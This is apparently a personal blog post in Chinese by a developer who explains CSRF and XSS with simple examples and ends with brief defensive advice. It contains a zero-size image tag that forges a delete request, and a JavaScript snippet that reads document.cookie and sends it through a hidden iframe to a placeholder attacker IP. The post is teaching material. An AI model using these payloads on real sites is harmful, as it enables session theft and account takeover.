---
title: CSRF 和 XSS
date: 2019-10-27
tags:
---

最近在做一个网站，因爲涉及到比较重要的账号，我一直战战兢兢，生怕一个不小心就搞出问题了。好在，rails 在安全方面所做的努力比我做的多得多。

<!-- more -->

说到网络攻击，最常见到的两个词就是 CSRF 和 XSS。这是比较常见，也比较简单的攻击了。只要网站的设计者缺少这方面的常识，就能轻易攻击。不过现在的网站框架都会加上这方面的防护了吧？

不过，我还是想做个简短的笔记，来回忆这几天的想法。

## 什麽是 CSRF

Crossing Site Request Forgery，跨站请求僞造。是一种利用 Cookies 进行攻击的方式。

在解释 CSRF 前，我们先来了解一下 Cookies 和 Sessions。由于 HTTP 的无状态机制，任意两个网页之间都是无关联的。爲了让它们产生关联，诞生了 sessions 和 cookies。当我们打开网站时，都是一个会话(sessions)，浏览器会临时保存这个 sessions，服务器靠着 sessions 来识别衆多用户中谁是谁，正因爲 浏览器 保存着 sessions，服务器才有能力辨识，当前访问的用户是 A 不是 B。浏览器被关闭后，就会消去 sessions。而 cookies 是保存得更久一点的方法，即使浏览器关掉后，也会保留一段时间。

大坏蛋就利用这两个机制，发起了 CSRF。

举个简单的例子。小明在 A 网站（http://A.com）登录后，爲了保证访问下一个页面时，服务器知道他是小明，浏览器里保存了 Cookies，当访问该网站的下一个页面是，就会连同 Cookies 一同发出。之后小明发表了一篇 id 爲 3 的论文。大坏蛋的 B 网站里，有一张图片是这样的。

```
<img src='https://A/delete?id=3' width='0' height='0' />
```

这段代码表示，在网页上显示长宽爲 0 的图片。虽然长宽爲 0，小明看不到，但浏览器却能看到，它会尝试访问 A 网站，并执行删除操作，将 id 爲 3 的文章删了。

如果是其它人的浏览器，访问了也就访问了，他们的浏览器访问 https://A/delete?id=3之后，并没有多大影响，因爲他们的浏览器里没有 cookies，没有登录，拒决了访问。

但对小明而言，这就是大问题了。小明的浏览器会访问 https://A/delete?id=3，然后将 A 网站的 Cookies 也一併伟过去。这个请求被A 网站的服备器收到，它们验证 Cookies，也没问题，是小明本人发过来的，那就执行删除操作吧。

于是，小明在不明不白的情况下，将自己发表在 A 网站上的文章删除了。

CSRF 是利用了用户对浏览器的信任，进行了攻击。XSS 和 CSRF 很像，但利用的是用户的另一个弱点。

## 什麽是XSS

和上面的方法很相似，攻击者在通过代码注入的形式，将攻击代码写入网页。

但它并非进行 CSRF 攻击，而是通过 JS 代码，获取打开网页的用户 cookies。

还是个简单的例子。

小明吸取了教训，在登录其它网站前，会登出 A 网站的用户，只有在访问 A 网站时，才会登录。

然而攻击者 小坏蛋 在 A 网站发表了一篇文章，然后在文章里注入

```
// 用 <script type="text/javascript"></script> 包起来放在文章中
(function(window, document) {
    var cookies = document.cookie;
    var xssURIBase = "http://小坏蛋的IP/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    document.body.appendChild(hideFrame);
})(window, document);
```

明面上，这篇文章没什麽问题，因爲 iframe 被隐藏了。但只要有人点开，就会触发上面的代码，将 cookies 发送到小坏蛋的网站。小坏蛋就获得了其他人的身份，大摇大摆的删除文章了。

与 CSRF 不同，这一次，小明并没有上不正规的网站，他浏览的是正规的 A 的网站，却依旧遭到了攻击。这一次，攻击的是 小明 对网站的信任。

---

所以，有些时候，我们不能将用户受到网络攻击，归到他们不注重自身安全（虽然很大一部分时间的确是这样的）。用户更多时候，是没有能力保证安全的，即使再注意，不上小网站，也会遭到 XSS 攻击。

因此在设计一个系统，一个网站时，我们要加强系统本身的抗打击能力。比如对付 CSRF，就验证访问源，使用 JWT 替代 cookies；对付 XSS，用过滤，警惕自己的用户。

道高一尺，魔高一丈。最近看了关于网络安全方面的文章，觉得自己还有很长的路要走。
